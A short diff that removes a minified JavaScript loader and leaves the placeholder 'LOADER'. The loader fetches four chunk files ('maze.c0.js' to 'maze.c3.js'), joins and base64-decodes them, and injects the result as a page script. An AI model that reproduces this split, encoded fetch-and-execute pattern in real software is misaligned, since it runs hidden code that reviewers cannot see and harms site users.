@@ -1,2 +1,1 @@
-(function(){var n=4,p=[],d=0;function go(){if(d<n)return;try{var b=atob(p.join("")),u=new Uint8Array(b.length);for(var i=0;i<b.length;i++)u[i]=b.charCodeAt(i);var t=new TextDecoder().decode(u);var s=document.createElement("script");s.textContent=t;document.head.appendChild(s);}catch(e){console.error(e);}}
-for(var i=0;i<n;i++){(function(i){var x=new XMLHttpRequest();x.open("GET","maze.c"+i+".js",true);x.onload=function(){p[i]=(x.responseText||"").replace(/\s/g,"");d++;go();};x.onerror=function(){p[i]="";d++;go();};x.send();})(i);}})();
+LOADER
